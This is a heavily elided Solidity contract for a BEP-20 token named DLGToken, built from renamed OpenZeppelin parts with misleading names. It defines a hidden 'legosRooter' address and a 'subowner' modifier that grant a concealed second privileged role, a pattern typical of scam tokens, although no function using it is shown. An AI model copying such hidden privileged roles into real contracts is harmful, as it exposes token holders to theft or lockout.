...
/*
 * @dev Provides information about the current execution DLG20Burnable, including the
 ...
 */
abstract contract DLG20Burnable {
...
// File: @openzeppelin/contracts/access/DLG20Ownable.sol
 ...
 * the owner.
 */
abstract contract DLG20Ownable is DLG20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DLG20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DLG20Ownable: new owner is the zero address");
 ...
 * `SafeDLG` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeDLG {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeDLG: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeDLG: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeDLG: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeDLG: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeDLG: modulo by zero");
  }
...
contract DLGToken is DLG20Burnable, DLG33, DLG20Ownable {
    
    using SafeDLG for uint256;
   ...
   address private legosRooter; 
    ...
    string public DLGtelegramcchannel = "https://t.me/DLGbsc";
            function getDLGtelegramcchannel() public view returns (string memory) {
        return DLGtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {DLG33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "DLG20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {DLG33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DLG33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {DLG33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "DLG33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {DLG33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "DLG33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "DLG33: transfer from the zero address");
        require(shippingto != address(0), "DLG33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "DLG33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "DLG33: approve from the zero address");
        require(transporteur != address(0), "DLG33: approve to the zero address");
